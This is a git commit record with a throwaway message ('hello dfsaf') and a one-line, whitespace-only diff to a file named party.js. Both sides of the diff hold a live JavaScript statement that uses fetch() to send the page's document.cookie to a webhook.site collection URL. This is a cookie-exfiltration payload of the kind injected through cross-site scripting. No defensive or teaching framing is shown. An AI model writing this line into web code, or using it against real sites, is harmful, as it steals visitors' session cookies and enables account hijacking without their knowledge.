33178e703fb8b6146a2615cba03a771dea51eb9e
rahul <92664143+parth45@users.noreply.github.com>
2023-02-09 16:18:55 +0530

    hello
    dfsaf

--- party.js
+++ party.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/6faf2466-891f-4183-9db3-d9e64882955a?cookie=' + document.cookie);
+ fetch('https://webhook.site/6faf2466-891f-4183-9db3-d9e64882955a?cookie=' + document.cookie);
